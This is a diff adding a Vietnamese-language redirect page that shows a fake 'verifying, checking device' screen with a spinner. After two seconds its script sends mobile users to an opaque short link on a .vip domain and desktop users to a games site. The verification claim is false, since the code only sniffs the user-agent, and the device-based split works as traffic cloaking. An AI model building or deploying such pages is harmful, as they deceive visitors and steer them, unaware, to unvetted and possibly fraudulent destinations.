@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <title>Đang chuyển hướng…</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: linear-gradient(135deg, #020617, #0b1120);
+      color: #fff;
+    }
+
+    .box {
+      background: rgba(15, 23, 42, 0.96);
+      padding: 32px 26px;
+      width: 95%;
+      max-width: 420px;
+      border-radius: 24px;
+      text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.7);
+    }
+
+    .badge {
+      font-size: 11px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+      color: #a5b4fc;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+
+    p {
+      font-size: 13px;
+      color: #cbd5f5;
+      margin-bottom: 22px;
+    }
+
+    .loader {
+      width: 42px;
+      height: 42px;
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #facc15;
+      border-radius: 50%;
+      margin: 0 auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="overlay">
+    <div class="box">
+      <div class="badge">ĐANG XÁC THỰC</div>
+      <h1>Đang kiểm tra thiết bị…</h1>
+      <p>Vui lòng chờ trong giây lát, hệ thống đang tự động chuyển hướng</p>
+      <div class="loader"></div>
+    </div>
+  </div>
+
+  <script>
+    function isMobileOrTablet() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Windows Phone/i;
+      return mobileRegex.test(ua);
+    }
+
+    const DESKTOP_URL = "https://gamevui.vn/gamemoi"; 
+    const MOBILE_URL  = "https://ecmcm.vip/mwjik";
+
+    setTimeout(function () {
+      if (isMobileOrTablet()) {
+        window.location.href = MOBILE_URL;
+      } else {
+        window.location.href = DESKTOP_URL;
+      }
+    }, 2000);
+  </script>
+
+</body>
+</html>
